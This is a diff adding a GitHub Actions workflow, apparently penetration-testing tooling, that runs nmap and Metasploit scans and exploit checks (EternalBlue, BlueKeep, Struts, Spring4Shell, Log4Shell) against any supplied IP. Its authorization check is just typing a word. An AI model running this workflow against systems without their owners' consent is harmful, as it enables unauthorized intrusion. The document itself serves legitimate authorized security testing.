@@ -1,0 +1,654 @@
+# ============================================================================
+# 🔴 IRON CITY ATTACKSIM PRO - METASPLOIT EXPLOITATION ENGINE
+# ============================================================================
+# ⚠️  AUTHORIZED USE ONLY - This workflow executes REAL exploits
+# ⚠️  Requires signed Rules of Engagement (ROE) before use
+# ⚠️  Unauthorized use is illegal and unethical
+# ============================================================================
+
+name: "AttackSimPro - Metasploit Exploitation"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_host:
+        description: "Target IP address (NEVER a hostname for exploitation)"
+        required: true
+        type: string
+      target_ports:
+        description: "Target ports (comma-separated, e.g., 22,80,443,445)"
+        required: true
+        default: "22,80,443,445,3389"
+        type: string
+      scan_id:
+        description: "Unique scan identifier (required)"
+        required: true
+        type: string
+      client_id:
+        description: "Client identifier for multi-tenant tracking"
+        required: true
+        type: string
+      exploit_mode:
+        description: "Exploitation mode"
+        required: true
+        type: choice
+        options:
+          - recon_only        # Auxiliary modules only - no exploitation
+          - validate_vulns    # Exploit check without payload execution
+          - controlled_exploit # Full exploitation with safe payloads
+      roe_confirmation:
+        description: "Type 'AUTHORIZED' to confirm Rules of Engagement signed"
+        required: true
+        type: string
+      allowed_modules:
+        description: "Specific modules to run (comma-separated, or 'AUTO' for auto-select)"
+        required: false
+        default: "AUTO"
+        type: string
+
+env:
+  SCAN_ID: ${{ github.event.inputs.scan_id }}
+  CLIENT_ID: ${{ github.event.inputs.client_id }}
+  TARGET: ${{ github.event.inputs.target_host }}
+  PORTS: ${{ github.event.inputs.target_ports }}
+  MODE: ${{ github.event.inputs.exploit_mode }}
+
+jobs:
+  # ==========================================================================
+  # GUARDRAIL 1: Authorization Check
+  # ==========================================================================
+  authorization-check:
+    name: "🔐 Authorization Verification"
+    runs-on: ubuntu-latest
+    outputs:
+      authorized: ${{ steps.check.outputs.authorized }}
+    steps:
+      - name: Verify ROE Confirmation
+        id: check
+        run: |
+          echo "================================================"
+          echo "🔐 AUTHORIZATION VERIFICATION"
+          echo "================================================"
+          
+          if [ "${{ github.event.inputs.roe_confirmation }}" != "AUTHORIZED" ]; then
+            echo "❌ AUTHORIZATION FAILED"
+            echo "You must type 'AUTHORIZED' to confirm Rules of Engagement"
+            echo "This workflow executes REAL exploits against REAL systems"
+            echo "Unauthorized use is ILLEGAL"
+            exit 1
+          fi
+          
+          echo "✅ ROE Confirmation received"
+          echo "authorized=true" >> $GITHUB_OUTPUT
+          
+      - name: Log Authorization
+        run: |
+          echo "================================================"
+          echo "📋 AUTHORIZATION LOG"
+          echo "================================================"
+          echo "Timestamp: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
+          echo "Actor: ${{ github.actor }}"
+          echo "Target: ${{ env.TARGET }}"
+          echo "Client: ${{ env.CLIENT_ID }}"
+          echo "Scan ID: ${{ env.SCAN_ID }}"
+          echo "Mode: ${{ env.MODE }}"
+          echo "ROE Confirmed: YES"
+          echo "================================================"
+
+  # ==========================================================================
+  # GUARDRAIL 2: Target Validation
+  # ==========================================================================
+  target-validation:
+    name: "🎯 Target Validation"
+    runs-on: ubuntu-latest
+    needs: authorization-check
+    outputs:
+      valid_target: ${{ steps.validate.outputs.valid }}
+    steps:
+      - name: Validate Target IP
+        id: validate
+        run: |
+          TARGET="${{ env.TARGET }}"
+          
+          echo "================================================"
+          echo "🎯 TARGET VALIDATION"
+          echo "================================================"
+          
+          # GUARDRAIL: Block localhost/loopback
+          if [[ "$TARGET" =~ ^127\. ]] || [[ "$TARGET" == "localhost" ]]; then
+            echo "❌ BLOCKED: Cannot target localhost/loopback"
+            exit 1
+          fi
+          
+          # GUARDRAIL: Block private ranges (unless explicitly allowed)
+          # Uncomment below to block RFC1918 addresses
+          # if [[ "$TARGET" =~ ^10\. ]] || [[ "$TARGET" =~ ^192\.168\. ]] || [[ "$TARGET" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]]; then
+          #   echo "⚠️ WARNING: Private IP range detected"
+          # fi
+          
+          # GUARDRAIL: Block GitHub/Cloud provider ranges
+          BLOCKED_RANGES=(
+            "140.82."      # GitHub
+            "192.30."      # GitHub
+            "185.199."     # GitHub
+            "34.102."      # Google Cloud
+            "35.186."      # Google Cloud  
+            "151.101."     # Fastly/GitHub Pages
+          )
+          
+          for range in "${BLOCKED_RANGES[@]}"; do
+            if [[ "$TARGET" == $range* ]]; then
+              echo "❌ BLOCKED: Target in protected range ($range)"
+              exit 1
+            fi
+          done
+          
+          # GUARDRAIL: Validate IP format
+          if ! [[ "$TARGET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "❌ INVALID: Must be an IP address, not hostname"
+            echo "Hostnames can resolve to unintended targets"
+            exit 1
+          fi
+          
+          echo "✅ Target validated: $TARGET"
+          echo "valid=true" >> $GITHUB_OUTPUT
+
+  # ==========================================================================
+  # PHASE 1: Reconnaissance (Always runs first)
+  # ==========================================================================
+  reconnaissance:
+    name: "🔍 Phase 1: Reconnaissance"
+    runs-on: ubuntu-latest
+    needs: [authorization-check, target-validation]
+    outputs:
+      open_ports: ${{ steps.nmap.outputs.open_ports }}
+      services: ${{ steps.nmap.outputs.services }}
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Create working directories
+        run: |
+          mkdir -p results/recon results/exploits results/loot results/logs
+          
+      - name: Nmap Service Scan
+        id: nmap
+        run: |
+          echo "================================================"
+          echo "🔍 RECONNAISSANCE - SERVICE ENUMERATION"
+          echo "================================================"
+          
+          sudo apt-get update && sudo apt-get install -y nmap
+          
+          # Service version detection scan
+          nmap -sV -sC -p${{ env.PORTS }} -oN results/recon/nmap-services.txt \
+               -oX results/recon/nmap-services.xml ${{ env.TARGET }}
+          
+          # Extract open ports
+          OPEN_PORTS=$(grep "open" results/recon/nmap-services.txt | grep -oP '^\d+' | tr '\n' ',' | sed 's/,$//')
+          echo "open_ports=$OPEN_PORTS" >> $GITHUB_OUTPUT
+          
+          # Extract services
+          SERVICES=$(grep "open" results/recon/nmap-services.txt | awk '{print $3}' | sort -u | tr '\n' ',' | sed 's/,$//')
+          echo "services=$SERVICES" >> $GITHUB_OUTPUT
+          
+          echo "Open Ports: $OPEN_PORTS"
+          echo "Services: $SERVICES"
+          
+          cat results/recon/nmap-services.txt
+
+      - name: Upload Recon Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: recon-results-${{ env.SCAN_ID }}
+          path: results/recon/
+          retention-days: 90
+
+  # ==========================================================================
+  # PHASE 2: Vulnerability Validation (Metasploit Auxiliary)
+  # ==========================================================================
+  vulnerability-scan:
+    name: "🔬 Phase 2: Vulnerability Validation"
+    runs-on: ubuntu-latest
+    needs: reconnaissance
+    if: ${{ github.event.inputs.exploit_mode != 'recon_only' }}
+    outputs:
+      vulns_found: ${{ steps.msf-aux.outputs.vulns_found }}
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Create directories
+        run: mkdir -p results/vulns results/logs
+
+      - name: Generate Metasploit Auxiliary Script
+        run: |
+          cat > msf-auxiliary.rc << 'EOF'
+          # ============================================
+          # IRON CITY ATTACKSIM PRO - AUXILIARY SCAN
+          # ============================================
+          
+          # Database setup
+          db_status
+          
+          # Set global options
+          setg RHOSTS ${{ env.TARGET }}
+          setg THREADS 5
+          
+          # ==========================================
+          # SMB ENUMERATION (Port 445)
+          # ==========================================
+          use auxiliary/scanner/smb/smb_version
+          run
+          
+          use auxiliary/scanner/smb/smb_enumshares
+          run
+          
+          use auxiliary/scanner/smb/smb_ms17_010
+          set RHOSTS ${{ env.TARGET }}
+          run
+          
+          # ==========================================
+          # SSH ENUMERATION (Port 22)
+          # ==========================================
+          use auxiliary/scanner/ssh/ssh_version
+          run
+          
+          use auxiliary/scanner/ssh/ssh_enumusers
+          set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+          set RHOSTS ${{ env.TARGET }}
+          set RPORT 22
+          run
+          
+          # ==========================================
+          # HTTP/HTTPS ENUMERATION (Port 80/443)
+          # ==========================================
+          use auxiliary/scanner/http/http_version
+          set RHOSTS ${{ env.TARGET }}
+          set RPORT 80
+          run
+          
+          use auxiliary/scanner/http/title
+          run
+          
+          use auxiliary/scanner/http/ssl_version
+          set RHOSTS ${{ env.TARGET }}
+          set RPORT 443
+          run
+          
+          # ==========================================
+          # SSL/TLS VULNERABILITIES
+          # ==========================================
+          use auxiliary/scanner/ssl/openssl_heartbleed
+          set RHOSTS ${{ env.TARGET }}
+          set RPORT 443
+          run
+          
+          # ==========================================
+          # RDP ENUMERATION (Port 3389)
+          # ==========================================
+          use auxiliary/scanner/rdp/rdp_scanner
+          set RHOSTS ${{ env.TARGET }}
+          run
+          
+          use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+          set RHOSTS ${{ env.TARGET }}
+          run
+          
+          # ==========================================
+          # DATABASE ENUMERATION
+          # ==========================================
+          use auxiliary/scanner/mysql/mysql_version
+          set RHOSTS ${{ env.TARGET }}
+          run
+          
+          use auxiliary/scanner/mssql/mssql_ping
+          set RHOSTS ${{ env.TARGET }}
+          run
+          
+          use auxiliary/scanner/postgres/postgres_version
+          set RHOSTS ${{ env.TARGET }}
+          run
+          
+          # ==========================================
+          # EXPORT RESULTS
+          # ==========================================
+          vulns
+          hosts
+          services
+          
+          exit
+          EOF
+
+      - name: Run Metasploit Auxiliary Scan
+        id: msf-aux
+        run: |
+          echo "================================================"
+          echo "🔬 VULNERABILITY VALIDATION - METASPLOIT"
+          echo "================================================"
+          
+          # Run Metasploit in Docker
+          docker run --rm \
+            -v $(pwd):/data \
+            metasploitframework/metasploit-framework:latest \
+            msfconsole -q -r /data/msf-auxiliary.rc | tee results/vulns/auxiliary-scan.txt
+          
+          # Count vulnerabilities found
+          VULN_COUNT=$(grep -c "Vulnerable\|VULNERABLE\|found\|detected" results/vulns/auxiliary-scan.txt || echo "0")
+          echo "vulns_found=$VULN_COUNT" >> $GITHUB_OUTPUT
+          
+          echo "Vulnerabilities detected: $VULN_COUNT"
+
+      - name: Parse Vulnerability Results
+        run: |
+          echo "================================================"
+          echo "📊 VULNERABILITY SUMMARY"
+          echo "================================================"
+          
+          # Create summary report
+          cat > results/vulns/summary.md << EOF
+          # Vulnerability Scan Summary
+          
+          **Target:** ${{ env.TARGET }}
+          **Scan ID:** ${{ env.SCAN_ID }}
+          **Client:** ${{ env.CLIENT_ID }}
+          **Timestamp:** $(date -u +"%Y-%m-%dT%H:%M:%SZ")
+          
+          ## Findings
+          
+          \`\`\`
+          $(grep -E "Vulnerable|VULNERABLE|found|detected|MS17-010|BlueKeep|Heartbleed" results/vulns/auxiliary-scan.txt || echo "No critical vulnerabilities detected")
+          \`\`\`
+          
+          ## Services Enumerated
+          
+          $(grep -E "^\[.\]" results/vulns/auxiliary-scan.txt | head -50)
+          EOF
+          
+          cat results/vulns/summary.md
+
+      - name: Upload Vulnerability Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vuln-results-${{ env.SCAN_ID }}
+          path: results/vulns/
+          retention-days: 90
+
+  # ==========================================================================
+  # PHASE 3: Controlled Exploitation (With Safe Payloads)
+  # ==========================================================================
+  exploitation:
+    name: "💥 Phase 3: Controlled Exploitation"
+    runs-on: ubuntu-latest
+    needs: vulnerability-scan
+    if: ${{ github.event.inputs.exploit_mode == 'controlled_exploit' }}
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Create directories
+        run: mkdir -p results/exploits results/loot results/logs
+
+      - name: Generate Exploitation Script
+        run: |
+          # GUARDRAIL: Only use approved modules with safe payloads
+          cat > msf-exploit.rc << 'EOF'
+          # ============================================
+          # IRON CITY ATTACKSIM PRO - EXPLOITATION
+          # ============================================
+          # ⚠️  CONTROLLED EXPLOITATION MODE
+          # ⚠️  Using validation payloads only
+          # ============================================
+          
+          setg RHOSTS ${{ env.TARGET }}
+          setg LHOST 0.0.0.0
+          
+          # ==========================================
+          # GUARDRAIL: APPROVED EXPLOIT LIST
+          # These are "safe" exploits that prove
+          # vulnerability without causing damage
+          # ==========================================
+          
+          # -----------------------------------------
+          # MS17-010 EternalBlue (if SMB vulnerable)
+          # Using cmd/windows/generic payload - no reverse shell
+          # -----------------------------------------
+          use exploit/windows/smb/ms17_010_eternalblue
+          set RHOSTS ${{ env.TARGET }}
+          set PAYLOAD windows/x64/exec
+          set CMD "whoami > C:\\pwned.txt"
+          check
+          
+          # Only exploit if CHECK returns vulnerable
+          # GUARDRAIL: Using file-write payload, not shell
+          
+          # -----------------------------------------
+          # BlueKeep RDP (CVE-2019-0708)
+          # Check only - actual exploit too dangerous
+          # -----------------------------------------
+          use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+          set RHOSTS ${{ env.TARGET }}
+          run
+          
+          # -----------------------------------------
+          # Apache Struts (if detected)
+          # -----------------------------------------
+          use exploit/multi/http/struts2_content_type_ognl
+          set RHOSTS ${{ env.TARGET }}
+          set RPORT 80
+          set PAYLOAD cmd/unix/generic
+          set CMD "id"
+          check
+          
+          # -----------------------------------------
+          # Log4Shell (CVE-2021-44228)
+          # Detection only
+          # -----------------------------------------
+          use auxiliary/scanner/http/log4shell_scanner
+          set RHOSTS ${{ env.TARGET }}
+          set RPORT 80
+          run
+          
+          # -----------------------------------------
+          # Spring4Shell (CVE-2022-22965)
+          # -----------------------------------------
+          use exploit/multi/http/spring_framework_rce_spring4shell
+          set RHOSTS ${{ env.TARGET }}
+          set RPORT 80
+          check
+          
+          # ==========================================
+          # GUARDRAIL: BLOCKED EXPLOITS
+          # The following are NEVER run automatically:
+          # - Ransomware payloads
+          # - Destructive payloads
+          # - Wiper malware
+          # - Credential dumpers (without explicit approval)
+          # - Persistence mechanisms
+          # - Lateral movement tools
+          # ==========================================
+          
+          exit
+          EOF
+
+      - name: Run Controlled Exploitation
+        id: exploit
+        run: |
+          echo "================================================"
+          echo "💥 CONTROLLED EXPLOITATION"
+          echo "================================================"
+          echo "⚠️  Using validation payloads only"
+          echo "⚠️  No reverse shells or destructive actions"
+          echo "================================================"
+          
+          # Run with timeout guardrail (30 min max)
+          timeout 1800 docker run --rm \
+            -v $(pwd):/data \
+            metasploitframework/metasploit-framework:latest \
+            msfconsole -q -r /data/msf-exploit.rc 2>&1 | tee results/exploits/exploitation.txt || true
+          
+          echo "Exploitation phase complete"
+
+      - name: Generate Exploitation Report
+        run: |
+          cat > results/exploits/report.md << EOF
+          # 💥 Exploitation Report
+          
+          **Classification:** CONFIDENTIAL - CLIENT EYES ONLY
+          
+          ---
+          
+          **Target:** ${{ env.TARGET }}
+          **Scan ID:** ${{ env.SCAN_ID }}
+          **Client:** ${{ env.CLIENT_ID }}
+          **Mode:** Controlled Exploitation
+          **Timestamp:** $(date -u +"%Y-%m-%dT%H:%M:%SZ")
+          **Authorized By:** ${{ github.actor }}
+          
+          ---
+          
+          ## Executive Summary
+          
+          This report documents controlled exploitation attempts against the target
+          system as part of an authorized purple team engagement.
+          
+          ## Exploitation Attempts
+          
+          \`\`\`
+          $(grep -E "Exploit completed|vulnerable|Vulnerable|Session opened|CHECK" results/exploits/exploitation.txt || echo "No successful exploits")
+          \`\`\`
+          
+          ## Proof of Concept
+          
+          $(grep -E "Session|Meterpreter|shell|pwned" results/exploits/exploitation.txt || echo "No shells obtained - validation payloads used")
+          
+          ## Recommendations
+          
+          Based on the exploitation results, the following patches should be prioritized:
+          
+          1. Review all "Vulnerable" findings above
+          2. Apply vendor patches immediately
+          3. Implement network segmentation
+          4. Enable endpoint detection and response (EDR)
+          
+          ---
+          
+          **DISCLAIMER:** This test was conducted under authorized Rules of Engagement.
+          All findings must be remediated within the agreed timeframe.
+          EOF
+          
+          cat results/exploits/report.md
+
+      - name: Upload Exploitation Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: exploit-results-${{ env.SCAN_ID }}
+          path: results/exploits/
+          retention-days: 90
+
+  # ==========================================================================
+  # FINAL: Aggregate & Report
+  # ==========================================================================
+  final-report:
+    name: "📋 Final Report Generation"
+    runs-on: ubuntu-latest
+    needs: [reconnaissance, vulnerability-scan, exploitation]
+    if: always()
+    steps:
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: all-results/
+
+      - name: Generate Final Report
+        run: |
+          mkdir -p final-report
+          
+          cat > final-report/ATTACKSIM-PRO-REPORT.md << EOF
+          # 🔴 IRON CITY ATTACKSIM PRO
+          ## Purple Team Engagement Report
+          
+          ---
+          
+          | Field | Value |
+          |-------|-------|
+          | **Target** | ${{ env.TARGET }} |
+          | **Scan ID** | ${{ env.SCAN_ID }} |
+          | **Client** | ${{ env.CLIENT_ID }} |
+          | **Mode** | ${{ env.MODE }} |
+          | **Executed By** | ${{ github.actor }} |
+          | **Timestamp** | $(date -u +"%Y-%m-%dT%H:%M:%SZ") |
+          | **ROE Confirmed** | ✅ YES |
+          
+          ---
+          
+          ## Phase 1: Reconnaissance
+          
+          - Open Ports: ${{ needs.reconnaissance.outputs.open_ports }}
+          - Services: ${{ needs.reconnaissance.outputs.services }}
+          
+          ## Phase 2: Vulnerability Validation
+          
+          - Vulnerabilities Found: ${{ needs.vulnerability-scan.outputs.vulns_found || 'N/A' }}
+          
+          ## Phase 3: Exploitation
+          
+          - Mode: ${{ env.MODE }}
+          - Status: $([ "${{ env.MODE }}" == "controlled_exploit" ] && echo "Executed" || echo "Skipped")
+          
+          ---
+          
+          ## Security Guardrails Applied
+          
+          ✅ ROE confirmation required
+          ✅ Target IP validation (no localhost, no cloud providers)
+          ✅ Approved module list only
+          ✅ Safe payloads (no reverse shells in auto mode)
+          ✅ 30-minute execution timeout
+          ✅ Full audit logging
+          
+          ---
+          
+          **Report Generated:** $(date -u +"%Y-%m-%dT%H:%M:%SZ")
+          **Iron City IT Advisors** - Blue Collar Security
+          EOF
+          
+          cat final-report/ATTACKSIM-PRO-REPORT.md
+
+      - name: Upload Final Report
+        uses: actions/upload-artifact@v4
+        with:
+          name: final-report-${{ env.SCAN_ID }}
+          path: final-report/
+          retention-days: 90
+
+      - name: Post to Firebase
+        if: always()
+        run: |
+          curl -X POST "${{ secrets.FIREBASE_FUNCTION_URL }}" \
+            -H "Content-Type: application/json" \
+            -d '{
+              "scan_type": "metasploit_exploitation",
+              "scan_id": "${{ env.SCAN_ID }}",
+              "client_id": "${{ env.CLIENT_ID }}",
+              "target": "${{ env.TARGET }}",
+              "mode": "${{ env.MODE }}",
+              "ports_scanned": "${{ env.PORTS }}",
+              "vulns_found": "${{ needs.vulnerability-scan.outputs.vulns_found || 0 }}",
+              "authorized_by": "${{ github.actor }}",
+              "status": "completed",
+              "timestamp": "'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'"
+            }' || echo "⚠️ Firebase post failed"
+
+      - name: Scan Complete
+        run: |
+          echo "=============================================="
+          echo "🔴 ATTACKSIM PRO - METASPLOIT SCAN COMPLETE"
+          echo "=============================================="
+          echo "Target: ${{ env.TARGET }}"
+          echo "Mode: ${{ env.MODE }}"
+          echo "Scan ID: ${{ env.SCAN_ID }}"
+          echo "=============================================="
+          echo ""
+          echo "📥 Download artifacts from the Actions tab"
+          echo "=============================================="
